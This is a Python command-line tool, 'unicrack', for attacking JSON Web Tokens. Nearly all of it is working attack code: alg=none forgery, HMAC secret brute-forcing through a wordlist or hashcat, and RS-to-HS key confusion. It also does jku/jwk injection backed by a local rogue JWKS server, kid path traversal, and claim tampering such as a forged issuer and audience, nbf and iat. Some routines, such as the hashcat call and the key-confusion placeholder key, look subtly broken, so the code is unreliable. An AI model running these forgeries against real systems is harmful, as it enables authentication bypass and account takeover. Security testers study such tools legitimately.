#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
unicrack – Swiss-army-knife for JWT research & exploitation

Author : Mon3m
"""

from __future__ import annotations

# ────────────────────────────  STANDARD / 3RD-PARTY  ────────────────────
import base64
import concurrent.futures as cf
import hashlib
import hmac
import json
import os
import re
import subprocess
import tempfile
import textwrap
import time
from contextlib import contextmanager
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import http.server
import socket
import ssl
import threading

import jwt                       #  PyJWT ≥2.7 (supports EdDSA & ES256K)
import typer                     #  Typer (Click wrapper)
from colorama import init as _cinit
from rich import box
from rich.console import Console
from rich.progress import BarColumn, Progress, TimeElapsedColumn
from rich.table import Table

# extra deps for some attacks
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

_cinit(autoreset=True)

# ──────────────────────────────  Typer APP  ─────────────────────────────
app = typer.Typer(
    add_completion=False,
    invoke_without_command=True,
    help="""[bold]unicrack[/bold] – Swiss-army-knife for JWT research & exploitation.

SAFE command (read-only):
   decode

ACTIVE commands (forge / network / cracking):
   none crack confuse jku duplicate crit sign

EXTRA active commands:
   kid traversal jwkskey jkuadv nested nestednone weakkey jwkrewrite
   confuseadv audbypass

NEW active commands (this patch):
   issuer critconfuse typoclaim jwemix nbf replay algtypo zipdef nestmix

Every ACTIVE command needs the explicit flag  [bold]--active[/bold] .
""",
)
console = Console()

# ───────────────────────────  START-UP BANNER  ──────────────────────────
_LOGO = r"""
██╗   ██╗███╗   ██╗██╗ ██████╗██████╗  █████╗  ██████╗██╗  ██╗
██║   ██║████╗  ██║██║██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
██║   ██║██╔██╗ ██║██║██║     ██████╔╝███████║██║     █████╔╝ 
██║   ██║██║╚██╗██║██║██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
╚██████╔╝██║ ╚████║██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
 ╚═════╝ ╚═╝  ╚═══╝╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
"""

def show_banner() -> None:
    for line in _LOGO.splitlines():
        console.print(line, style="bold cyan", justify="center")
    console.print("[italic dim]by[/italic dim] [bold magenta]mon3m[/bold magenta]",
                  justify="center")
    console.print()

# ──────────────────────────────  CONSTANTS  ─────────────────────────────
Json  = Dict[str, Any]
Parts = Tuple[Json, Json, str]
CPU_COUNT = os.cpu_count() or 2
__VERSION__ = "3.0.0-preview-4"   # bumped

ALG_RS_ES_PS = re.compile(r"^(RS|ES|PS)\d+$", re.I)
HS_DIGEST = {"HS256": hashlib.sha256,
             "HS384": hashlib.sha384,
             "HS512": hashlib.sha512}

FAKE_PUBKEY = textwrap.dedent("""\
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvFakeKeyForDemonstration
-----END PUBLIC KEY-----""").strip()

# ────────────────────────────  HELPERS / MISC  ─────────────────────────
def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

def b64url_decode(b64: str) -> bytes:
    b64 += "=" * (-len(b64) % 4)
    return base64.urlsafe_b64decode(b64)

def pretty_error(msg: str) -> None:
    console.print(f"[bold red]Error:[/bold red] {msg}")
    raise typer.Exit(1)

@contextmanager
def timing(label: str) -> None:
    t0 = time.perf_counter()
    console.status(f"[cyan]{label} …[/cyan]")
    yield
    console.log(f"[green]{label} finished in {time.perf_counter()-t0:0.2f}s[/green]")

def parse_jwt(token: str) -> Parts:
    try:
        header: Json = jwt.get_unverified_header(token)
        payload: Json = jwt.decode(token, options={"verify_signature": False})
    except (jwt.DecodeError, jwt.InvalidTokenError) as exc:
        raise ValueError(f"JWT decode failed – {exc}") from exc
    sig = token.split(".", 2)[-1] if token.count(".") == 2 else ""
    return header, payload, sig

def pretty_print(header: Json, payload: Json, sig: str) -> None:
    tbl = Table(title="JWT details", box=box.MINIMAL_DOUBLE_HEAD)
    tbl.add_column("Part", style="cyan", no_wrap=True)
    tbl.add_column("Value", style="magenta")
    tbl.add_row("Header"   , json.dumps(header , indent=2))
    tbl.add_row("Payload"  , json.dumps(payload, indent=2))
    tbl.add_row("Signature", sig or "<detached / none>")
    console.print(tbl)

def validate_token(tok: str) -> str:
    try: parse_jwt(tok)
    except ValueError as e: pretty_error(str(e))
    return tok

# ───────────────────────────────  FORGERS  ─────────────────────────────
def forge_none(hdr: Json, pl: Json) -> str:
    hdr2 = {**hdr, "alg": "none"}
    return f"{b64url_encode(json.dumps(hdr2).encode())}."\
           f"{b64url_encode(json.dumps(pl).encode())}."

def forge_hs(hdr: Json, pl: Json, secret: str, alg: str="HS256") -> str:
    if alg not in HS_DIGEST: raise ValueError("Unsupported HS alg")
    hdr2  = {**hdr, "alg": alg}
    h_b64 = b64url_encode(json.dumps(hdr2).encode())
    p_b64 = b64url_encode(json.dumps(pl ).encode())
    sig   = b64url_encode(hmac.new(secret.encode(),
                                   f"{h_b64}.{p_b64}".encode(),
                                   HS_DIGEST[alg]).digest())
    return f"{h_b64}.{p_b64}.{sig}"

# ─────────────────────────  HSx BRUTE-FORCE  ────────────────────────────
def _hs_worker(word: bytes, signing_input: bytes, target: str, alg: str) -> Optional[str]:
    sig = b64url_encode(hmac.new(word, signing_input, HS_DIGEST[alg]).digest())
    return word.decode() if sig == target else None

def hs_bruteforce(token: str, wordlist: Path, jobs: int, gpu: bool=False) -> Optional[str]:
    header, _, signature = parse_jwt(token)
    alg = header.get("alg", "HS256").upper()
    if alg not in HS_DIGEST: pretty_error("Token alg is not HS256/384/512")
    signing_input = token.rsplit(".", 1)[0].encode()

    # GPU via hashcat (HS256 only)
    if gpu and alg == "HS256":
        return _hashcat(token, wordlist, alg)
    if gpu and alg != "HS256":
        console.print("[yellow]GPU only for HS256 – falling back to CPU[/yellow]")

    try: total = sum(1 for _ in wordlist.open("rb"))
    except OSError: total = None
    with Progress("[progress.description]{task.description}", BarColumn(),
                  "{task.completed}"+("/"+str(total) if total else ""),
                  TimeElapsedColumn(), console=console) as prog, \
         wordlist.open("rb") as fh, timing("CPU brute-force"):
        t = prog.add_task("Cracking", total=total)
        with cf.ProcessPoolExecutor(max_workers=jobs) as ex:
            futs = {ex.submit(_hs_worker, line.strip(), signing_input,
                              signature, alg): None
                    for line in fh if line.strip()}
            for f in cf.as_completed(futs):
                prog.update(t, advance=1)
                res = f.result()
                if res:
                    console.print(f"[bold green]Secret found → {res}[/bold green]")
                    ex.shutdown(cancel_futures=True)
                    return res
    console.print("[red]Secret NOT found[/red]")
    return None

def _hashcat(token: str, wordlist: Path, alg: str) -> Optional[str]:
    mode = "16500"                  # HS256
    signing_input = token.rsplit(".", 1)[0]
    digest = b64url_encode(HS_DIGEST[alg](signing_input.encode()).digest())
    sig    = token.split(".")[2]
    pot    = Path(os.environ.get("HASHCAT_POTFILE_PATH",
                                 Path.home()/".hashcat"/"hashcat.potfile"))
    with tempfile.NamedTemporaryFile("w", delete=False) as tmp:
        tmp.write(f"{sig}:{digest}"); tmp_path = tmp.name
    cmd = ["hashcat","-a","0","-m",mode,tmp_path,str(wordlist),"--quiet"]
    console.print("[cyan]Off-loading to hashcat …[/cyan]")
    try: subprocess.run(cmd, check=True,
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        console.print("[red]Hashcat failed or not found[/red]"); return None
    if not pot.exists(): return None
    with pot.open() as fh:
        for line in fh:
            if sig in line: return line.strip().split(":",2)[-1]
    return None

# ───────────────────────────── BASE ATTACKS  ────────────────────────────
def key_confusion(token: str) -> Optional[str]:
    hdr, pl, _ = parse_jwt(token)
    alg = str(hdr.get("alg", ""))
    if not ALG_RS_ES_PS.match(alg):
        console.print("[yellow]Token is not RS/ES/PS – skipping[/yellow]")
        return None
    forged = forge_hs(hdr, pl, FAKE_PUBKEY, alg="HS256")
    console.print("[green]Forged token (pubkey as HMAC secret):[/green]")
    console.print(forged)
    return forged

def duplicate_claim(hdr: Json, pl: Json, claim: str="exp") -> str:
    new_pl = pl.copy(); new_pl[f"{claim}2"] = 0
    return forge_none(hdr, new_pl)

def crit_header(hdr: Json, pl: Json) -> str:
    hdr2 = {**hdr, "crit": ["evil"], "evil": True, "alg": "none"}
    return forge_none(hdr2, pl)

# ───────────────────  JWKS MINI-SERVER (SAFE)  ──────────────────────────
JWKS_JSON = json.dumps({"keys":[{"kty":"oct","kid":"evil","k":"QQ"}]})

class _JWKSHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):                                  # type: ignore
        self.send_response(200)
        self.send_header("Content-Type","application/json")
        self.send_header("Content-Length", str(len(JWKS_JSON)))
        self.end_headers(); self.wfile.write(JWKS_JSON.encode())
    def log_message(self, *_): pass

def _serve_jwks(https: bool=False) -> str:
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.bind(("127.0.0.1",0)); port = sock.getsockname()[1]; sock.close()
    srv = http.server.HTTPServer(("127.0.0.1",port), _JWKSHandler)
    if https:
        ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ctx.load_cert_chain(certfile=Path(__file__).with_suffix(".crt"),
                            keyfile =Path(__file__).with_suffix(".key"))
        srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return f"{'https' if https else 'http'}://127.0.0.1:{port}/jwks.json"

def jku_inject(hdr: Json, pl: Json, which: str="both") -> List[str]:
    url = _serve_jwks()
    fields = ("jku","x5u") if which=="both" else (which,)
    forged=[]
    for fld in fields:
        hdr2 = {**hdr, fld:url, "alg":"none"}
        forged.append(forge_none(hdr2,pl))
        console.print(f"[green]Forged token with {fld} → {url}[/green]")
    console.print("[cyan](JWKS server running in background)[/cyan]")
    return forged

# ─────────────────────────────  CLI  – SAFE  ────────────────────────────
@app.command(help="Decode / pretty-print a JWT (read-only).")
def decode(token: str = typer.Option(..., "-t", "--token", callback=validate_token),
           output: str = typer.Option("table","-o","--output",
                                      help="[table] (default) | json | raw")):
    hdr, pl, sig = parse_jwt(token)
    if output=="json":
        console.print(json.dumps({"header":hdr,"payload":pl,
                                  "signature":sig,"version":__VERSION__},indent=2))
    elif output=="raw":
        console.print(json.dumps(hdr)); console.print(json.dumps(pl))
    else:
        pretty_print(hdr,pl,sig)

# ────────────────────────────  CLI – ACTIVE  (OLD)  ────────────────────
@app.command(help="Brute-force HS256 / 384 / 512 secret (CPU/GPU).")
def crack(token: str = typer.Option(...,"-t","--token",callback=validate_token),
          wordlist: Path = typer.Option(...,"-w","--wordlist",exists=True,readable=True),
          jobs: int = typer.Option(CPU_COUNT,"-j","--jobs"),
          gpu: bool = typer.Option(False,"--gpu"),
          active: bool = typer.Option(False,"--active")):
    if not active: pretty_error("Add --active to confirm exploitation intent")
    hs_bruteforce(token,wordlist,jobs,gpu)

@app.command(help="Forge 'alg=none' version of a JWT.")
def none(token: str = typer.Option(...,"-t","--token",callback=validate_token),
         active: bool = typer.Option(False,"--active")):
    if not active: pretty_error("Need --active for token forgery")
    hdr,pl,_=parse_jwt(token); console.print(forge_none(hdr,pl))

@app.command(help="RS/ES/PS → HS key-confusion (pubkey as HMAC secret).")
def confuse(token: str = typer.Option(...,"-t","--token",callback=validate_token),
            active: bool = typer.Option(False,"--active")):
    if not active: pretty_error("Need --active for token forging")
    key_confusion(token)

@app.command(help="Inject malicious jku/x5u that points to local JWKS server.")
def jku(token: str = typer.Option(...,"-t","--token",callback=validate_token),
        which: str = typer.Option("both","--which", help="jku|x5u|both"),
        active: bool = typer.Option(False,"--active")):
    if not active: pretty_error("Need --active for token forging")
    hdr,pl,_=parse_jwt(token); jku_inject(hdr,pl,which)

@app.command(help="Create token with duplicate claim (default: exp).")
def duplicate(token: str = typer.Option(...,"-t","--token",callback=validate_token),
              claim: str = typer.Option("exp","--claim"),
              active: bool = typer.Option(False,"--active")):
    if not active: pretty_error("Need --active for token forging")
    hdr,pl,_=parse_jwt(token); console.print(duplicate_claim(hdr,pl,claim))

@app.command(help="Inject unknown 'crit' header.")
def crit(token: str = typer.Option(...,"-t","--token",callback=validate_token),
         active: bool = typer.Option(False,"--active")):
    if not active: pretty_error("Need --active for token forging")
    hdr,pl,_=parse_jwt(token); console.print(crit_header(hdr,pl))

@app.command(help="(Re)-sign a token with EdDSA (Ed25519) or ES256K.")
def sign(token: str = typer.Option(...,"-t","--token",callback=validate_token),
         keyfile: Path = typer.Option(...,"-k","--key",exists=True,readable=True),
         alg: str = typer.Option(...,"-a","--alg",help="EdDSA | ES256K"),
         kid: Optional[str] = typer.Option(None,"--kid"),
         active: bool = typer.Option(False,"--active")):
    if not active: pretty_error("Need --active for signing")
    alg = alg.upper()
    if alg not in ("EDDSA","ES256K"): pretty_error("alg must be EdDSA or ES256K")
    hdr,pl,_ = parse_jwt(token); hdr["alg"]=alg;
    if kid: hdr["kid"]=kid
    key = keyfile.read_text()
    try: new_tok = jwt.encode(pl, key, algorithm=alg, headers=hdr)
    except Exception as exc: pretty_error(f"Signing failed – {exc}")
    console.print("[green]Signed token:[/green]"); console.print(new_tok)

# ────────────────────────────────────────────────────────────────────────
#                        EXTRA  ATTACKS  
# ────────────────────────────────────────────────────────────────────────
def _need_active(flag: bool):
    if not flag:
        pretty_error("Need --active to run this attack")

# 1  KID header injection
def _kid_inject(hdr: Json, pl: Json, kid: str="evil") -> str:
    return forge_none({**hdr, "kid": kid, "alg": "none"}, pl)

# 2  Directory traversal via KID
def _kid_traversal(hdr: Json, pl: Json,
                   depth: int=8, fname: str="keys/secret.pem") -> str:
    return _kid_inject(hdr, pl, "../"*depth + fname)

# 3  Full JWKS key injection (oct / HS256)
def _jwks_key_inject(hdr: Json, pl: Json) -> str:
    secret = b"ultra-secret-octkey"
    jwk = {"kty":"oct","k":b64url_encode(secret),"kid":"evil_oct","alg":"HS256"}
    hdr2 = {**hdr,"jwk":jwk,"kid":"evil_oct","alg":"HS256"}
    return forge_hs(hdr2, pl, secret.decode())

# 4  Public-key substitution (advanced JKU abuse)
def _jku_pubkey_sub(hdr: Json, pl: Json):
    key = rsa.generate_private_key(public_exponent=0x10001, key_size=2048)
    priv_pem = key.private_bytes(serialization.Encoding.PEM,
                                 serialization.PrivateFormat.PKCS8,
                                 serialization.NoEncryption())
    nums = key.public_key().public_numbers()
    n = b64url_encode(nums.n.to_bytes((nums.n.bit_length()+7)//8,"big"))
    e = b64url_encode(nums.e.to_bytes((nums.e.bit_length()+7)//8,"big"))
    kid = "adv_rsa"
    global JWKS_JSON
    JWKS_JSON = json.dumps({"keys":[{"kty":"RSA","kid":kid,"alg":"RS256","n":n,"e":e}]})
    url = _serve_jwks()
    hdr2 = {**hdr,"alg":"RS256","kid":kid,"jku":url}
    tok = jwt.encode(pl, priv_pem, algorithm="RS256", headers=hdr2)
    return tok, priv_pem.decode(), url

# 5  Nested JWT
def _nested_jwt(hdr: Json, pl: Json):
    inner = forge_none({"alg":"none"}, {**pl, "nested":True})
    return forge_none({**hdr,"alg":"none","cty":"application/jwt"}, {"jwt":inner})

# 6  Nested JWT + none-downgrade
def _nested_none_downgrade(hdr: Json, pl: Json):
    inner = forge_none(hdr, pl)
    return forge_none({"alg":"none","cty":"JWT"}, {"jwt":inner})

# 7  Weak key generation (short RSA)
def _weak_key(hdr: Json, pl: Json, bits: int=512):
    key = rsa.generate_private_key(public_exponent=0x10001, key_size=bits)
    priv = key.private_bytes(serialization.Encoding.PEM,
                             serialization.PrivateFormat.PKCS8,
                             serialization.NoEncryption())
    tok = jwt.encode(pl, priv, algorithm="RS256", headers={**hdr,"alg":"RS256","weak":True})
    return tok, priv.decode()

# 8  JWK URL rewrite attack
def _jwk_url_rewrite(hdr: Json, pl: Json):
    secret = b"rewrite-k3y"
    jwk = {"kty":"oct","k":b64url_encode(secret),"kid":"rewrite","alg":"HS256"}
    url = _serve_jwks()
    hdr2 = {**hdr,"alg":"HS256","kid":"rewrite","jku":url,"jwk":jwk}
    return forge_hs(hdr2, pl, secret.decode())

# 9  Key-confusion advanced (RS→HS offline)
def _key_confusion_adv(tok: str):
    hdr, pl, _ = parse_jwt(tok)
    if hdr.get("alg","").upper() != "RS256":
        console.print("[yellow]Token is not RS256 – skipping[/yellow]")
        return None
    fake_secret="A"*128
    return forge_hs({**hdr,"alg":"HS256"}, pl, fake_secret)

#10  Audience bypass
def _aud_bypass(hdr: Json, pl: Json, wrong: str="wrong_aud"):
    new_pl = pl.copy()
    if "aud" in new_pl:
        if isinstance(new_pl["aud"], list):
            new_pl["aud"].append(wrong)
        else:
            new_pl["aud"] = [new_pl["aud"], wrong]
    else:
        new_pl["aud"] = wrong
    return forge_none(hdr, new_pl)

# ────────────────────────────────────────────────────────────────────────
#              NEW  ATTACKS  
# ────────────────────────────────────────────────────────────────────────
# 1  Issuer claim manipulation / duplication
def _issuer_manipulation(h: Json, p: Json, new_iss: str = "https://evil.example"):
    p2 = p.copy()
    if "iss" in p2:                      # keep original under different name
        p2["issuer"] = p2["iss"]
    p2["iss"] = new_iss
    return forge_none(h, p2)

# 2  Critical-claims confusion (declare 'exp' critical but wrong type)
def _crit_claims_confusion(h: Json, p: Json):
    p2 = p.copy(); p2["exp"] = "never"   # string instead of int
    h2 = {**h, "crit": ["exp"], "alg": "none"}
    return forge_none(h2, p2)

# 3  Typo-claims attack (exp → expp, nbf → nbff, aud → audd)
def _typo_claims(h: Json, p: Json):
    p2 = p.copy()
    if "exp" in p2: p2["expp"] = p2.pop("exp")
    if "nbf" in p2: p2["nbff"] = p2.pop("nbf")
    if "aud" in p2: p2["audd"] = p2.pop("aud")
    return forge_none(h, p2)

# 4  Signed-then-encrypted JWT attack (cheap JWE wrapper)
def _signed_then_encrypted(h: Json, p: Json, secret: str = "s3cret"):
    inner_jws = forge_hs({**h, "alg": "HS256"}, p, secret)
    jwe_hdr = {"alg": "dir", "enc": "A128CBC-HS256", "cty": "JWT"}
    parts = [
        b64url_encode(json.dumps(jwe_hdr).encode()),
        "", "",                               # encrypted_key, iv
        b64url_encode(inner_jws.encode()),    # ciphertext
        ""                                    # auth tag
    ]
    return ".".join(parts)

# 5  nbf manipulation (epoch-0 or far future)
def _nbf_manipulation(h: Json, p: Json, when: str = "past"):
    p2 = p.copy()
    p2["nbf"] = 0 if when == "past" else int(time.time()) + 10**7
    return forge_none(h, p2)

# 6  Replay attack with modified timestamp (iat shift)
def _replay_mod_ts(h: Json, p: Json, seconds: int = -3600):
    p2 = p.copy(); p2["iat"] = int(time.time()) + seconds
    return forge_none(h, p2)

# 7  Typo in algorithm name confusion ("RS256 " etc.)
def _alg_typo_confusion(h: Json, p: Json):
    h2 = {**h, "alg": (h.get("alg", "RS256") + " ").rstrip() + " "}
    return forge_none(h2, p)

# 8  Compression flag confusion (zip=DEF without compression)
def _zip_def_confusion(h: Json, p: Json):
    h2 = {**h, "zip": "DEF", "alg": "none"}
    return forge_none(h2, p)

# 9  Mix-and-match nested JWE/JWS confusion
def _nest_mix_confusion(h: Json, p: Json, secret: str = "k"):
    inner = forge_none({"alg": "none"}, {**p, "lvl": 1})
    mid   = forge_hs({"alg": "HS256"}, {"jwt": inner, "lvl": 2}, secret)
    jwe_hdr = {"alg": "dir", "enc": "A128GCM", "cty": "JWT"}
    outer = ".".join([b64url_encode(json.dumps(jwe_hdr).encode()), "", "",
                      b64url_encode(mid.encode()), ""])
    return outer

# ───────────────────────────  EXTRA CLI COMMANDS  ───────────────────────
opt = typer.Option  # shorthand

# older extra commands (kid … audbypass) ---------------------------------
@app.command(help="(active) Simple KID header injection (alg=none).")
def kid(token: str = opt(...,"-t","--token",callback=validate_token),
        kid: str = opt("evil","--kid"),
        active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token); console.print(_kid_inject(h,p,kid))

@app.command(help="(active) Directory-traversal via kid.")
def traversal(token: str = opt(...,"-t","--token",callback=validate_token),
              depth: int = opt(8,"--depth"),
              path: str = opt("keys/secret.pem","--file"),
              active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    console.print(_kid_traversal(h,p,depth,path))

@app.command(help="(active) Full JWKS key-injection (oct/HS256).")
def jwkskey(token: str = opt(...,"-t","--token",callback=validate_token),
            active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token); console.print(_jwks_key_inject(h,p))

@app.command(help="(active) Public-key substitution via JKU (advanced).")
def jkuadv(token: str = opt(...,"-t","--token",callback=validate_token),
           active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    tok,priv,url=_jku_pubkey_sub(h,p)
    console.print(f"[green]Malicious JWKS at:[/green] {url}")
    console.print(f"[green]Private key:[/green]\n{priv}")
    console.print(f"[green]Forged token:[/green]\n{tok}")

@app.command(help="(active) Nested JWT attack.")
def nested(token: str = opt(...,"-t","--token",callback=validate_token),
           active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token); console.print(_nested_jwt(h,p))

@app.command(help="(active) Nested JWT with alg=none downgrade.")
def nestednone(token: str = opt(...,"-t","--token",callback=validate_token),
               active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token); console.print(_nested_none_downgrade(h,p))

@app.command(help="(active) Generate weak RSA key & sign token.")
def weakkey(token: str = opt(...,"-t","--token",callback=validate_token),
            bits: int = opt(512,"--bits"),
            active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    tok,priv=_weak_key(h,p,bits)
    console.print(f"[green]{bits}-bit private key:[/green]\n{priv}")
    console.print(f"[green]Signed token:[/green]\n{tok}")

@app.command(help="(active) JWK URL rewrite attack.")
def jwkrewrite(token: str = opt(...,"-t","--token",callback=validate_token),
               active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token); console.print(_jwk_url_rewrite(h,p))

@app.command(help="(active) RS256→HS256 key-confusion (offline).")
def confuseadv(token: str = opt(...,"-t","--token",callback=validate_token),
               active: bool = opt(False,"--active")):
    _need_active(active); forged=_key_confusion_adv(token)
    if forged: console.print(forged)

@app.command(help="(active) JWT bypass via incorrect audience.")
def audbypass(token: str = opt(...,"-t","--token",callback=validate_token),
              aud: str = opt("wrong_aud","--add"),
              active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token); console.print(_aud_bypass(h,p,aud))

# NEW commands -----------------------------------------------------------
@app.command(help="(active) Manipulate / duplicate the issuer claim.")
def issuer(token: str = opt(...,"-t","--token",callback=validate_token),
           new: str = opt("https://evil.example","--new"),
           active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    console.print(_issuer_manipulation(h,p,new))

@app.command(help="(active) Critical-claims confusion attack.")
def critconfuse(token: str = opt(...,"-t","--token",callback=validate_token),
                active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    console.print(_crit_claims_confusion(h,p))

@app.command(help="(active) Typo-claims attack (expp/nbff/audd).")
def typoclaim(token: str = opt(...,"-t","--token",callback=validate_token),
              active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    console.print(_typo_claims(h,p))

@app.command(help="(active) Signed-then-encrypted (JWS→JWE mix) POC.")
def jwemix(token: str = opt(...,"-t","--token",callback=validate_token),
           secret: str = opt("s3cret","--secret"),
           active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    console.print(_signed_then_encrypted(h,p,secret))

@app.command(help="(active) Manipulate nbf claim (past|future).")
def nbf(token: str = opt(...,"-t","--token",callback=validate_token),
        when: str = opt("past","--when",help="past|future"),
        active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    console.print(_nbf_manipulation(h,p,when))

@app.command(help="(active) Replay attack – modify iat timestamp.")
def replay(token: str = opt(...,"-t","--token",callback=validate_token),
           shift: int = opt(-3600,"--shift",help="seconds to add to now"),
           active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    console.print(_replay_mod_ts(h,p,shift))

@app.command(help="(active) Confuse parser with typo in alg name.")
def algtypo(token: str = opt(...,"-t","--token",callback=validate_token),
            active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    console.print(_alg_typo_confusion(h,p))

@app.command(help="(active) zip=DEF compression confusion (no real deflate).")
def zipdef(token: str = opt(...,"-t","--token",callback=validate_token),
           active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    console.print(_zip_def_confusion(h,p))

@app.command(help="(active) Mix-and-match nested JWE/JWS confusion.")
def nestmix(token: str = opt(...,"-t","--token",callback=validate_token),
            secret: str = opt("k","--secret"),
            active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    console.print(_nest_mix_confusion(h,p,secret))

# ─────────────────────────────── MAIN  ─────────────────────────────────
@app.callback()
def _root(ctx: typer.Context):
    if ctx.invoked_subcommand is None:
        console.print(app.get_help())

if __name__ == "__main__":
    show_banner()
    app()
